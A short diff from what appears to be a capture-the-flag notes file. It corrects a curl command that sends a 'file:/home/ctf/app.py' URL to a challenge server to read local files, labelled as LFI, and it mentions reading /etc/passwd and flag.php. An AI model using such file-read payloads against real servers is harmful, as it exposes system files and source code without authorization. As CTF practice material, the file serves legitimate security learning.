@@ -5,7 +5,8 @@ Curl –x ‘POST’ ‘http://IP/?start=’ –data ‘start=flag.php’ Alien-
 
 
 File:/etc/passwd      File:/home/ctf/app.py
-Curl –x $’POST’ \
--H $’Host:company.tld’\   
---data $’url=file:home/ctf/app.py’\
-$’http://34.141.113.155:32567/’                               LFI  Ultra-Crawler
+curl -X POST \
+-H 'Host: company.tld' \
+--data 'url=file:/home/ctf/app.py' \
+http://34.141.113.155:32567/
+                                                  LFI  Ultra-Crawler
